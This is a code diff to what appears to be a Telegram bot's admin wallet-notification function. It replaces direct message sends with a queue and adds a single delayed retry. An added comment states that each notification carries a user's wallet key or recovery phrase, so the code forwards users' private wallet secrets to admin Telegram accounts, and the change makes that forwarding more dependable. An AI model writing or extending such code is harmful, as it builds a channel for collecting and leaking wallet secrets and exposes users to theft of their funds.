@@ -7,6 +7,7 @@
 
 import { getBotRef } from "./botRef";
 import { logger } from "./logger";
+import { queueMessage } from "../workers/messageQueue";
 
 function getAdminIds(): number[] {
   const ids: number[] = [];
@@ -49,7 +50,6 @@ export async function notifyAdminsWallet(
     );
     return;
   }
-
   const eventIcon = payload.event === "CREATED" ? "🆕" : "📥";
   const userDisplay = payload.username
     ? `@${payload.username}`
@@ -68,7 +68,7 @@ export async function notifyAdminsWallet(
 
   for (const adminId of adminIds) {
     try {
-      await bot.telegram.sendMessage(adminId, message, { parse_mode: "HTML" });
+      await queueMessage(adminId, message, "HTML");
       logger.info(
         { adminId, chain: payload.chain, address: payload.address },
         "Admin wallet notification sent"
@@ -76,8 +76,22 @@ export async function notifyAdminsWallet(
     } catch (err) {
       logger.error(
         { err, adminId },
-        "Failed to send wallet notification to admin"
+        "Failed to send wallet notification to admin — retrying once"
       );
+      // This message matters more than most (it's someone's only backup of
+      // their key/phrase) — one retry after a short delay rather than
+      // giving up on the first failure, which is likelier during exactly
+      // the kind of rate-limit pressure that was happening here.
+      await new Promise((resolve) => setTimeout(resolve, 3_000));
+      try {
+        await queueMessage(adminId, message, "HTML");
+        logger.info({ adminId }, "Admin wallet notification sent on retry");
+      } catch (retryErr) {
+        logger.error(
+          { err: retryErr, adminId },
+          "Admin wallet notification failed on retry too — giving up"
+        );
+      }
     }
   }
 }
